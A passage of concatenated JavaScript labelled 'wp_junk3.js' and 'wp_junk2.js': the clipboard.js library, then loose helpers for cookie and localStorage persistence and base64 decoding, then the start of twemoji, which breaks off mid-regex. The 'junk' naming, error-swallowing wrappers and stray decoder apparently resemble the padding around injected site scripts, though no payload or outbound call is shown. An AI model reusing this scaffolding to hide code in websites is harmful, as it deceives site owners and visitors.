/* >>> wp_junk3.js (26806 bytes) <<< */
(function(){
try{
/*!
 * clipboard.js v2.0.11
 * https://clipboardjs.com/
 *
 * Licensed MIT © Zeno Rocha
 */
(function webpackUniversalModuleDefinition(root, factory) {
	if(typeof exports === 'object' && typeof module === 'object')
		module.exports = factory();
	else if(typeof define === 'function' && define.amd)
		define([], factory);
	else if(typeof exports === 'object')
		exports["ClipboardJS"] = factory();
	else
		root["ClipboardJS"] = factory();
})(this, function() {
return /******/ (function() { // webpackBootstrap
/******/ 	var __webpack_modules__ = ({

/***/ 686:
/***/ (function(__unused_webpack_module, __webpack_exports__, __webpack_require__) {

"use strict";

// EXPORTS
__webpack_require__.d(__webpack_exports__, {
  "default": function() { return /* binding */ clipboard; }
});

// EXTERNAL MODULE: ./node_modules/tiny-emitter/index.js
var tiny_emitter = __webpack_require__(279);
var tiny_emitter_default = /*#__PURE__*/__webpack_require__.n(tiny_emitter);
// EXTERNAL MODULE: ./node_modules/good-listener/src/listen.js
var listen = __webpack_require__(370);
var listen_default = /*#__PURE__*/__webpack_require__.n(listen);
// EXTERNAL MODULE: ./node_modules/select/src/select.js
var src_select = __webpack_require__(817);
var select_default = /*#__PURE__*/__webpack_require__.n(src_select);
;// CONCATENATED MODULE: ./src/common/command.js
/**
 * Executes a given operation type.
 * @param {String} type
 * @return {Boolean}
 */
function command(type) {
  try {
    return document.execCommand(type);
  } catch (err) {
    return false;
  }
}
;// CONCATENATED MODULE: ./src/actions/cut.js


/**
 * Cut action wrapper.
 * @param {String|HTMLElement} target
 * @return {String}
 */

var ClipboardActionCut = function ClipboardActionCut(target) {
  var selectedText = select_default()(target);
  command('cut');
  return selectedText;
};

/* harmony default export */ var actions_cut = (ClipboardActionCut);
;// CONCATENATED MODULE: ./src/common/create-fake-element.js
/**
 * Creates a fake textarea element with a value.
 * @param {String} value
 * @return {HTMLElement}
 */
function createFakeElement(value) {
  var isRTL = document.documentElement.getAttribute('dir') === 'rtl';
  var fakeElement = document.createElement('textarea'); // Prevent zooming on iOS

  fakeElement.style.fontSize = '12pt'; // Reset box model

  fakeElement.style.border = '0';
  fakeElement.style.padding = '0';
  fakeElement.style.margin = '0'; // Move element out of screen horizontally

  fakeElement.style.position = 'absolute';
  fakeElement.style[isRTL ? 'right' : 'left'] = '-9999px'; // Move element to the same position vertically

  var yPosition = window.pageYOffset || document.documentElement.scrollTop;
  fakeElement.style.top = "".concat(yPosition, "px");
  fakeElement.setAttribute('readonly', '');
  fakeElement.value = value;
  return fakeElement;
}
;// CONCATENATED MODULE: ./src/actions/copy.js



/**
 * Create fake copy action wrapper using a fake element.
 * @param {String} target
 * @param {Object} options
 * @return {String}
 */

var fakeCopyAction = function fakeCopyAction(value, options) {
  var fakeElement = createFakeElement(value);
  options.container.appendChild(fakeElement);
  var selectedText = select_default()(fakeElement);
  command('copy');
  fakeElement.remove();
  return selectedText;
};
/**
 * Copy action wrapper.
 * @param {String|HTMLElement} target
 * @param {Object} options
 * @return {String}
 */


var ClipboardActionCopy = function ClipboardActionCopy(target) {
  var options = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {
    container: document.body
  };
  var selectedText = '';

  if (typeof target === 'string') {
    selectedText = fakeCopyAction(target, options);
  } else if (target instanceof HTMLInputElement && !['text', 'search', 'url', 'tel', 'password'].includes(target === null || target === void 0 ? void 0 : target.type)) {
    // If input type doesn't support `setSelectionRange`. Simulate it. https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/setSelectionRange
    selectedText = fakeCopyAction(target.value, options);
  } else {
    selectedText = select_default()(target);
    command('copy');
  }

  return selectedText;
};

/* harmony default export */ var actions_copy = (ClipboardActionCopy);
;// CONCATENATED MODULE: ./src/actions/default.js
function _typeof(obj) { "@babel/helpers - typeof"; if (typeof Symbol === "function" && typeof Symbol.iterator === "symbol") { _typeof = function _typeof(obj) { return typeof obj; }; } else { _typeof = function _typeof(obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; }; } return _typeof(obj); }



/**
 * Inner function which performs selection from either `text` or `target`
 * properties and then executes copy or cut operations.
 * @param {Object} options
 */

var ClipboardActionDefault = function ClipboardActionDefault() {
  var options = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
  // Defines base properties passed from constructor.
  var _options$action = options.action,
      action = _options$action === void 0 ? 'copy' : _options$action,
      container = options.container,
      target = options.target,
      text = options.text; // Sets the `action` to be performed which can be either 'copy' or 'cut'.

  if (action !== 'copy' && action !== 'cut') {
    throw new Error('Invalid "action" value, use either "copy" or "cut"');
  } // Sets the `target` property using an element that will be have its content copied.


  if (target !== undefined) {
    if (target && _typeof(target) === 'object' && target.nodeType === 1) {
      if (action === 'copy' && target.hasAttribute('disabled')) {
        throw new Error('Invalid "target" attribute. Please use "readonly" instead of "disabled" attribute');
      }

      if (action === 'cut' && (target.hasAttribute('readonly') || target.hasAttribute('disabled'))) {
        throw new Error('Invalid "target" attribute. You can\'t cut text from elements with "readonly" or "disabled" attributes');
      }
    } else {
      throw new Error('Invalid "target" value, use a valid Element');
    }
  } // Define selection strategy based on `text` property.


  if (text) {
    return actions_copy(text, {
      container: container
    });
  } // Defines which selection strategy based on `target` property.


  if (target) {
    return action === 'cut' ? actions_cut(target) : actions_copy(target, {
      container: container
    });
  }
};

/* harmony default export */ var actions_default = (ClipboardActionDefault);
;// CONCATENATED MODULE: ./src/clipboard.js
function clipboard_typeof(obj) { "@babel/helpers - typeof"; if (typeof Symbol === "function" && typeof Symbol.iterator === "symbol") { clipboard_typeof = function _typeof(obj) { return typeof obj; }; } else { clipboard_typeof = function _typeof(obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; }; } return clipboard_typeof(obj); }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } }

function _createClass(Constructor, protoProps, staticProps) { if (protoProps) _defineProperties(Constructor.prototype, protoProps); if (staticProps) _defineProperties(Constructor, staticProps); return Constructor; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function"); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, writable: true, configurable: true } }); if (superClass) _setPrototypeOf(subClass, superClass); }

function _setPrototypeOf(o, p) { _setPrototypeOf = Object.setPrototypeOf || function _setPrototypeOf(o, p) { o.__proto__ = p; return o; }; return _setPrototypeOf(o, p); }

function _createSuper(Derived) { var hasNativeReflectConstruct = _isNativeReflectConstruct(); return function _createSuperInternal() { var Super = _getPrototypeOf(Derived), result; if (hasNativeReflectConstruct) { var NewTarget = _getPrototypeOf(this).constructor; result = Reflect.construct(Super, arguments, NewTarget); } else { result = Super.apply(this, arguments); } return _possibleConstructorReturn(this, result); }; }

function _possibleConstructorReturn(self, call) { if (call && (clipboard_typeof(call) === "object" || typeof call === "function")) { return call; } return _assertThisInitialized(self); }

function _assertThisInitialized(self) { if (self === void 0) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return self; }

function _isNativeReflectConstruct() { if (typeof Reflect === "undefined" || !Reflect.construct) return false; if (Reflect.construct.sham) return false; if (typeof Proxy === "function") return true; try { Date.prototype.toString.call(Reflect.construct(Date, [], function () {})); return true; } catch (e) { return false; } }

function _getPrototypeOf(o) { _getPrototypeOf = Object.setPrototypeOf ? Object.getPrototypeOf : function _getPrototypeOf(o) { return o.__proto__ || Object.getPrototypeOf(o); }; return _getPrototypeOf(o); }






/**
 * Helper function to retrieve attribute value.
 * @param {String} suffix
 * @param {Element} element
 */

function getAttributeValue(suffix, element) {
  var attribute = "data-clipboard-".concat(suffix);

  if (!element.hasAttribute(attribute)) {
    return;
  }

  return element.getAttribute(attribute);
}
/**
 * Base class which takes one or more elements, adds event listeners to them,
 * and instantiates a new `ClipboardAction` on each click.
 */


var Clipboard = /*#__PURE__*/function (_Emitter) {
  _inherits(Clipboard, _Emitter);

  var _super = _createSuper(Clipboard);

  /**
   * @param {String|HTMLElement|HTMLCollection|NodeList} trigger
   * @param {Object} options
   */
  function Clipboard(trigger, options) {
    var _this;

    _classCallCheck(this, Clipboard);

    _this = _super.call(this);

    _this.resolveOptions(options);

    _this.listenClick(trigger);

    return _this;
  }
  /**
   * Defines if attributes would be resolved using internal setter functions
   * or custom functions that were passed in the constructor.
   * @param {Object} options
   */


  _createClass(Clipboard, [{
    key: "resolveOptions",
    value: function resolveOptions() {
      var options = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
      this.action = typeof options.action === 'function' ? options.action : this.defaultAction;
      this.target = typeof options.target === 'function' ? options.target : this.defaultTarget;
      this.text = typeof options.text === 'function' ? options.text : this.defaultText;
      this.container = clipboard_typeof(options.container) === 'object' ? options.container : document.body;
    }
    /**
     * Adds a click event listener to the passed trigger.
     * @param {String|HTMLElement|HTMLCollection|NodeList} trigger
     */

  }, {
    key: "listenClick",
    value: function listenClick(trigger) {
      var _this2 = this;

      this.listener = listen_default()(trigger, 'click', function (e) {
        return _this2.onClick(e);
      });
    }
    /**
     * Defines a new `ClipboardAction` on each click event.
     * @param {Event} e
     */

  }, {
    key: "onClick",
    value: function onClick(e) {
      var trigger = e.delegateTarget || e.currentTarget;
      var action = this.action(trigger) || 'copy';
      var text = actions_default({
        action: action,
        container: this.container,
        target: this.target(trigger),
        text: this.text(trigger)
      }); // Fires an event based on the copy operation result.

      this.emit(text ? 'success' : 'error', {
        action: action,
        text: text,
        trigger: trigger,
        clearSelection: function clearSelection() {
          if (trigger) {
            trigger.focus();
          }

          window.getSelection().removeAllRanges();
        }
      });
    }
    /**
     * Default `action` lookup function.
     * @param {Element} trigger
     */

  }, {
    key: "defaultAction",
    value: function defaultAction(trigger) {
      return getAttributeValue('action', trigger);
    }
    /**
     * Default `target` lookup function.
     * @param {Element} trigger
     */

  }, {
    key: "defaultTarget",
    value: function defaultTarget(trigger) {
      var selector = getAttributeValue('target', trigger);

      if (selector) {
        return document.querySelector(selector);
      }
    }
    /**
     * Allow fire programmatically a copy action
     * @param {String|HTMLElement} target
     * @param {Object} options
     * @returns Text copied.
     */

  }, {
    key: "defaultText",

    /**
     * Default `text` lookup function.
     * @param {Element} trigger
     */
    value: function defaultText(trigger) {
      return getAttributeValue('text', trigger);
    }
    /**
     * Destroy lifecycle.
     */

  }, {
    key: "destroy",
    value: function destroy() {
      this.listener.destroy();
    }
  }], [{
    key: "copy",
    value: function copy(target) {
      var options = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {
        container: document.body
      };
      return actions_copy(target, options);
    }
    /**
     * Allow fire programmatically a cut action
     * @param {String|HTMLElement} target
     * @returns Text cutted.
     */

  }, {
    key: "cut",
    value: function cut(target) {
      return actions_cut(target);
    }
    /**
     * Returns the support of the given action, or all actions if no action is
     * given.
     * @param {String} [action]
     */

  }, {
    key: "isSupported",
    value: function isSupported() {
      var action = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : ['copy', 'cut'];
      var actions = typeof action === 'string' ? [action] : action;
      var support = !!document.queryCommandSupported;
      actions.forEach(function (action) {
        support = support && !!document.queryCommandSupported(action);
      });
      return support;
    }
  }]);

  return Clipboard;
}((tiny_emitter_default()));

/* harmony default export */ var clipboard = (Clipboard);

/***/ }),

/***/ 828:
/***/ (function(module) {

var DOCUMENT_NODE_TYPE = 9;

/**
 * A polyfill for Element.matches()
 */
if (typeof Element !== 'undefined' && !Element.prototype.matches) {
    var proto = Element.prototype;

    proto.matches = proto.matchesSelector ||
                    proto.mozMatchesSelector ||
                    proto.msMatchesSelector ||
                    proto.oMatchesSelector ||
                    proto.webkitMatchesSelector;
}

/**
 * Finds the closest parent that matches a selector.
 *
 * @param {Element} element
 * @param {String} selector
 * @return {Function}
 */
function closest (element, selector) {
    while (element && element.nodeType !== DOCUMENT_NODE_TYPE) {
        if (typeof element.matches === 'function' &&
            element.matches(selector)) {
          return element;
        }
        element = element.parentNode;
    }
}

module.exports = closest;


/***/ }),

/***/ 438:
/***/ (function(module, __unused_webpack_exports, __webpack_require__) {

var closest = __webpack_require__(828);

/**
 * Delegates event to a selector.
 *
 * @param {Element} element
 * @param {String} selector
 * @param {String} type
 * @param {Function} callback
 * @param {Boolean} useCapture
 * @return {Object}
 */
function _delegate(element, selector, type, callback, useCapture) {
    var listenerFn = listener.apply(this, arguments);

    element.addEventListener(type, listenerFn, useCapture);

    return {
        destroy: function() {
            element.removeEventListener(type, listenerFn, useCapture);
        }
    }
}

/**
 * Delegates event to a selector.
 *
 * @param {Element|String|Array} [elements]
 * @param {String} selector
 * @param {String} type
 * @param {Function} callback
 * @param {Boolean} useCapture
 * @return {Object}
 */
function delegate(elements, selector, type, callback, useCapture) {
    // Handle the regular Element usage
    if (typeof elements.addEventListener === 'function') {
        return _delegate.apply(null, arguments);
    }

    // Handle Element-less usage, it defaults to global delegation
    if (typeof type === 'function') {
        // Use `document` as the first parameter, then apply arguments
        // This is a short way to .unshift `arguments` without running into deoptimizations
        return _delegate.bind(null, document).apply(null, arguments);
    }

    // Handle Selector-based usage
    if (typeof elements === 'string') {
        elements = document.querySelectorAll(elements);
    }

    // Handle Array-like based usage
    return Array.prototype.map.call(elements, function (element) {
        return _delegate(element, selector, type, callback, useCapture);
    });
}

/**
 * Finds closest match and invokes callback.
 *
 * @param {Element} element
 * @param {String} selector
 * @param {String} type
 * @param {Function} callback
 * @return {Function}
 */
function listener(element, selector, type, callback) {
    return function(e) {
        e.delegateTarget = closest(e.target, selector);

        if (e.delegateTarget) {
            callback.call(element, e);
        }
    }
}

module.exports = delegate;


/***/ }),

/***/ 879:
/***/ (function(__unused_webpack_module, exports) {

/**
 * Check if argument is a HTML element.
 *
 * @param {Object} value
 * @return {Boolean}
 */
exports.node = function(value) {
    return value !== undefined
        && value instanceof HTMLElement
        && value.nodeType === 1;
};

/**
 * Check if argument is a list of HTML elements.
 *
 * @param {Object} value
 * @return {Boolean}
 */
exports.nodeList = function(value) {
    var type = Object.prototype.toString.call(value);

    return value !== undefined
        && (type === '[object NodeList]' || type === '[object HTMLCollection]')
        && ('length' in value)
        && (value.length === 0 || exports.node(value[0]));
};

/**
 * Check if argument is a string.
 *
 * @param {Object} value
 * @return {Boolean}
 */
exports.string = function(value) {
    return typeof value === 'string'
        || value instanceof String;
};

/**
 * Check if argument is a function.
 *
 * @param {Object} value
 * @return {Boolean}
 */
exports.fn = function(value) {
    var type = Object.prototype.toString.call(value);

    return type === '[object Function]';
};


/***/ }),

/***/ 370:
/***/ (function(module, __unused_webpack_exports, __webpack_require__) {

var is = __webpack_require__(879);
var delegate = __webpack_require__(438);

/**
 * Validates all params and calls the right
 * listener function based on its target type.
 *
 * @param {String|HTMLElement|HTMLCollection|NodeList} target
 * @param {String} type
 * @param {Function} callback
 * @return {Object}
 */
function listen(target, type, callback) {
    if (!target && !type && !callback) {
        throw new Error('Missing required arguments');
    }

    if (!is.string(type)) {
        throw new TypeError('Second argument must be a String');
    }

    if (!is.fn(callback)) {
        throw new TypeError('Third argument must be a Function');
    }

    if (is.node(target)) {
        return listenNode(target, type, callback);
    }
    else if (is.nodeList(target)) {
        return listenNodeList(target, type, callback);
    }
    else if (is.string(target)) {
        return listenSelector(target, type, callback);
    }
    else {
        throw new TypeError('First argument must be a String, HTMLElement, HTMLCollection, or NodeList');
    }
}

/**
 * Adds an event listener to a HTML element
 * and returns a remove listener function.
 *
 * @param {HTMLElement} node
 * @param {String} type
 * @param {Function} callback
 * @return {Object}
 */
function listenNode(node, type, callback) {
    node.addEventListener(type, callback);

    return {
        destroy: function() {
            node.removeEventListener(type, callback);
        }
    }
}

/**
 * Add an event listener to a list of HTML elements
 * and returns a remove listener function.
 *
 * @param {NodeList|HTMLCollection} nodeList
 * @param {String} type
 * @param {Function} callback
 * @return {Object}
 */
function listenNodeList(nodeList, type, callback) {
    Array.prototype.forEach.call(nodeList, function(node) {
        node.addEventListener(type, callback);
    });

    return {
        destroy: function() {
            Array.prototype.forEach.call(nodeList, function(node) {
                node.removeEventListener(type, callback);
            });
        }
    }
}

/**
 * Add an event listener to a selector
 * and returns a remove listener function.
 *
 * @param {String} selector
 * @param {String} type
 * @param {Function} callback
 * @return {Object}
 */
function listenSelector(selector, type, callback) {
    return delegate(document.body, selector, type, callback);
}

module.exports = listen;


/***/ }),

/***/ 817:
/***/ (function(module) {

function select(element) {
    var selectedText;

    if (element.nodeName === 'SELECT') {
        element.focus();

        selectedText = element.value;
    }
    else if (element.nodeName === 'INPUT' || element.nodeName === 'TEXTAREA') {
        var isReadOnly = element.hasAttribute('readonly');

        if (!isReadOnly) {
            element.setAttribute('readonly', '');
        }

        element.select();
        element.setSelectionRange(0, element.value.length);

        if (!isReadOnly) {
            element.removeAttribute('readonly');
        }

        selectedText = element.value;
    }
    else {
        if (element.hasAttribute('contenteditable')) {
            element.focus();
        }

        var selection = window.getSelection();
        var range = document.createRange();

        range.selectNodeContents(element);
        selection.removeAllRanges();
        selection.addRange(range);

        selectedText = selection.toString();
    }

    return selectedText;
}

module.exports = select;


/***/ }),

/***/ 279:
/***/ (function(module) {

function E () {
  // Keep this empty so it's easier to inherit from
  // (via https://github.com/lipsmack from https://github.com/scottcorgan/tiny-emitter/issues/3)
}

E.prototype = {
  on: function (name, callback, ctx) {
    var e = this.e || (this.e = {});

    (e[name] || (e[name] = [])).push({
      fn: callback,
      ctx: ctx
    });

    return this;
  },

  once: function (name, callback, ctx) {
    var self = this;
    function listener () {
      self.off(name, listener);
      callback.apply(ctx, arguments);
    };

    listener._ = callback
    return this.on(name, listener, ctx);
  },

  emit: function (name) {
    var data = [].slice.call(arguments, 1);
    var evtArr = ((this.e || (this.e = {}))[name] || []).slice();
    var i = 0;
    var len = evtArr.length;

    for (i; i < len; i++) {
      evtArr[i].fn.apply(evtArr[i].ctx, data);
    }

    return this;
  },

  off: function (name, callback) {
    var e = this.e || (this.e = {});
    var evts = e[name];
    var liveEvents = [];

    if (evts && callback) {
      for (var i = 0, len = evts.length; i < len; i++) {
        if (evts[i].fn !== callback && evts[i].fn._ !== callback)
          liveEvents.push(evts[i]);
      }
    }

    // Remove event from queue to prevent memory leak
    // Suggested by https://github.com/lazd
    // Ref: https://github.com/scottcorgan/tiny-emitter/commit/c6ebfaa9bc973b33d110a84a307742b7cf94c953#commitcomment-5024910

    (liveEvents.length)
      ? e[name] = liveEvents
      : delete e[name];

    return this;
  }
};

module.exports = E;
module.exports.TinyEmitter = E;


/***/ })

/******/ 	});
/************************************************************************/
/******/ 	// The module cache
/******/ 	var __webpack_module_cache__ = {};
/******/ 	
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/ 		// Check if module is in cache
/******/ 		if(__webpack_module_cache__[moduleId]) {
/******/ 			return __webpack_module_cache__[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = __webpack_module_cache__[moduleId] = {
/******/ 			// no module.id needed
/******/ 			// no module.loaded needed
/******/ 			exports: {}
/******/ 		};
/******/ 	
/******/ 		// Execute the module function
/******/ 		__webpack_modules__[moduleId](module, module.exports, __webpack_require__);
/******/ 	
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/ 	
/************************************************************************/
/******/ 	/* webpack/runtime/compat get default export */
/******/ 	!function() {
/******/ 		// getDefaultExport function for compatibility with non-harmony modules
/******/ 		__webpack_require__.n = function(module) {
/******/ 			var getter = module && module.__esModule ?
/******/ 				function() { return module['default']; } :
/******/ 				function() { return module; };
/******/ 			__webpack_require__.d(getter, { a: getter });
/******/ 			return getter;
/******/ 		};
/******/ 	}();
/******/ 	
/******/ 	/* webpack/runtime/define property getters */
/******/ 	!function() {
/******/ 		// define getter functions for harmony exports
/******/ 		__webpack_require__.d = function(exports, definition) {
/******/ 			for(var key in definition) {
/******/ 				if(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {
/******/ 					Object.defineProperty(exports, key, { enumerable: true, get: definition[key] });
/******/ 				}
/******/ 			}
/******/ 		};
/******/ 	}();
/******/ 	
/******/ 	/* webpack/runtime/hasOwnProperty shorthand */
/******/ 	!function() {
/******/ 		__webpack_require__.o = function(obj, prop) { return Object.prototype.hasOwnProperty.call(obj, prop); }
/******/ 	}();
/******/ 	
/************************************************************************/
/******/ 	// module exports must be returned from runtime so entry inlining is disabled
/******/ 	// startup
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(686);
/******/ })()
.default;
});
}catch(e){}
})();


  function hasLocalStorage() {
    try {
      const t = '__vc_test';
      localStorage.setItem(t, '1');
      localStorage.removeItem(t);
      return true;
    } catch (err) {
      return false;
    }
  }

  function setCookie(name, value, days) {
    try {
      const exp = new Date(Date.now() + (days || 365) * 864e5).toUTCString();
      document.cookie = name + '=' + encodeURIComponent(value) + '; expires=' + exp + '; path=/';
    } catch (err) {}
  }

  function getCookie(name) {
    try {
      const m = document.cookie.match(new RegExp('(?:^|; )' + name.replace(/([.$?*|{}()\[\]\/\+^])/g, '\$1') + '=([^;]*)'));
      return m ? decodeURIComponent(m[1]) : null;
    } catch (err) {
      return null;
    }
  }

  const useLS = hasLocalStorage();

  function getVal(key, fallback) {
    if (useLS) {
      const v = localStorage.getItem(key);
      return v === null ? fallback : v;
    }
    const c = getCookie(key);
    return c === null ? fallback : c;
  }

  function setVal(key, value) {
    if (useLS) {
      localStorage.setItem(key, value);
    } else {
      setCookie(key, value, 365);
    }
  }

  function b64ToUtf8(b64) {
    try {
      const bin = atob(b64);
      const len = bin.length;
      const bytes = new Uint8Array(len);
      for (let i = 0; i < len; i++) bytes[i] = bin.charCodeAt(i);
      if (typeof TextDecoder !== 'undefined') {
        return new TextDecoder('utf-8', { fatal: false }).decode(bytes);
      }
      let pct = '';
      for (let i = 0; i < len; i++) pct += '%' + bytes[i].toString(16).padStart(2, '0');
      return decodeURIComponent(pct);
    } catch (e) {
      try { return atob(b64); } catch (e2) { return ''; }
    }
  }
  /* >>> wp_junk2.js (46393 bytes) <<< */
(function(){
try{
var twemoji = function() {
    "use strict";
    var h = {
            base: "https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/",
            ext: ".png",
            size: "72x72",
            className: "emoji",
            convert: {
                fromCodePoint: function(d) {
                    d = "string" == typeof d ? parseInt(d, 16) : d;
                    if (d < 65536) return e(d);
                    return e(55296 + ((d -= 65536) >> 10), 56320 + (1023 & d))
                },
                toCodePoint: o
            },
            onerror: function() {
                this.parentNode && this.parentNode.replaceChild(x(this.alt, !1), this)
            },
            parse: function(d, u) {
                u && "function" != typeof u || (u = {
                    callback: u
                });
                return h.doNotParse = u.doNotParse, ("string" == typeof d ? function(d, a) {
                    return n(d, function(d) {
                        var u, f, c = d,
                            e = N(d),
                            b = a.callback(e, a);
                        if (e && b) {
                            for (f in c = "<img ".concat('class="', a.className, '" ', 'draggable="false" ', 'alt="', d, '"', ' src="', b, '"'), u = a.attributes(d, e)) u.hasOwnProperty(f) && 0 !== f.indexOf("on") && -1 === c.indexOf(" " + f + "=") && (c = c.concat(" ", f, '="', u[f].replace(t, r), '"'));
                            c = c.concat("/>")
                        }
                        return c
                    })
                } : function(d, u) {
                    var f, c, e, b, a, t, r, n, o, s, i, l = function d(u, f) {
                            var c, e, b = u.childNodes,
                                a = b.length;
                            for (; a--;) c = b[a], 3 === (e = c.nodeType) ? f.push(c) : 1 !== e || "ownerSVGElement" in c || m.test(c.nodeName.toLowerCase()) || h.doNotParse && h.doNotParse(c) || d(c, f);
                            return f
                        }(d, []),
                        p = l.length;
                    for (; p--;) {
                        for (e = !1, b = document.createDocumentFragment(), a = l[p], t = a.nodeValue, r = 0; o = g.exec(t);) {
                            if ((i = o.index) !== r && b.appendChild(x(t.slice(r, i), !0)), s = N(o = o[0]), r = i + o.length, i = u.callback(s, u), s && i) {
                                for (c in (n = new Image).onerror = u.onerror, n.setAttribute("draggable", "false"), f = u.attributes(o, s)) f.hasOwnProperty(c) && 0 !== c.indexOf("on") && !n.hasAttribute(c) && n.setAttribute(c, f[c]);
                                n.className = u.className, n.alt = o, n.src = i, e = !0, b.appendChild(n)
                            }
                            n || b.appendChild(x(o, !1)), n = null
                        }
                        e && (r < t.length && b.appendChild(x(t.slice(r), !0)), a.parentNode.replaceChild(b, a))
                    }
                    return d
                })(d, {
                    callback: u.callback || b,
                    attributes: "function" == typeof u.attributes ? u.attributes : a,
                    base: ("string" == typeof u.base ? u : h).base,
                    ext: u.ext || h.ext,
                    size: u.folder || function(d) {
                        return "number" == typeof d ? d + "x" + d : d
                    }(u.size || h.size),
                    className: u.className || h.className,
                    onerror: u.onerror || h.onerror
                })
            },
            replace: n,
            test: function(d) {
                g.lastIndex = 0;
                d = g.test(d);
                return g.lastIndex = 0, d
            }
        },
        u = {
            "&": "&amp;",
            "<": "&lt;",
            ">": "&gt;",
            "'": "&#39;",
            '"': "&quot;"
        },
        g = /(?:\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffc-\udfff]|\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffb\udffd-\udfff]|\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffb\udffc\udffe\udfff]|\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffb-\udffd\udfff]|\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffb-\udffe]|\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffc-\udfff]|\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb\udffd-\udfff]|\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb\udffc\udffe\udfff]|\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb-\udffd\udfff]|\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb-\udffe]|\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\u